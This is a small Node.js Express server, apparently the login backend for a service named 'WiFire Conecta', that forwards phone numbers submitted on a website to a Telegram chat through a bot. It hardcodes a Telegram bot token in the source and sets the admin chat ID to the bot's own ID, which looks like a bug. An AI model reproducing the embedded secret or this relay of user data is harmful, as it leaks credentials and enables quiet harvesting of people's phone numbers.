const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');

const app = express();
const port = 3000;

// Token do bot WiFire Conecta
const token = '7581940581:AAH35oxpMuNWt9BXhJVYn_ZpiRlTADEnSfM';

// Inicia o bot com polling
const bot = new TelegramBot(token, { polling: true });

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Rota para receber número do site
app.post('/login', (req, res) => {
  const { phone } = req.body;

  if (!phone) {
    return res.status(400).json({ error: 'Número não informado' });
  }

  // ID do administrador no Telegram
  const adminChatId = '7581940581'; // O mesmo ID usado na criação

  bot.sendMessage(adminChatId, `📲 Novo login no WiFire Conecta:\nNúmero informado: ${phone}`);

  return res.status(200).json({ status: 'sucesso', mensagem: 'Login enviado com sucesso' });
});

// Mensagem automática para quem envia algo pro bot
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '✅ Conectado ao sistema WiFire Conecta.\nUse o site para se logar via número.');
});

// Inicia servidor
app.listen(port, () => {
  console.log(`🌐 Servidor ativo: http://localhost:${port}`);
});
